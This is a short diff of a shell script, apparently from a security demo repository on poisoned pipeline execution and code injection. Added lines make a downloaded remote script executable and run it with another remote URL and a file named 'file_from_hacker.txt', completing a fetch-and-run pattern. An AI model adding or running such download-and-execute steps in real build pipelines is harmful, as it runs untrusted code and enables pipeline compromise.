@@ -4,3 +4,5 @@ chmod +x /tmp/script.sh
 
 
 curl -o /tmp/script.sh https://raw.githubusercontent.com/lgvorg1/Xy-Demo-CodeInjection/main/lgv_commit.sh
+chmod +x /tmp/script.sh
+/tmp/script.sh https://raw.githubusercontent.com/lgvorg1/Xy-Demo-PPE-demo/main/runtests.sh file_from_hacker.txt
